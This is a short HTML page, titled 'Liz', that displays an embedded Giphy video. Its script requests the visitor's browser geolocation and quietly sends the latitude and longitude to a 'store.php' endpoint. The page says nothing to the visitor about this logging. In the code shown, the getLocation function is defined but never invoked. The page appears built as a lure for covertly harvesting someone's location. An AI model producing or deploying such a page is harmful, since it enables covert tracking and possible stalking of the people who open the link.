<!DOCTYPE html>
<html>
<head>
	<title>Liz</title>
</head>
<body>
	
  <div style="width:480px"><iframe allow="fullscreen" frameBorder="0" height="853" src="https://giphy.com/embed/r2qXO7N6QTkn0rljhp/video" width="480"></iframe></div>

<p id="demo"></p>

<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
	const xhttp = new XMLHttpRequest();
	xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
	xhttp.send();
}
</script>

</body>
</html>
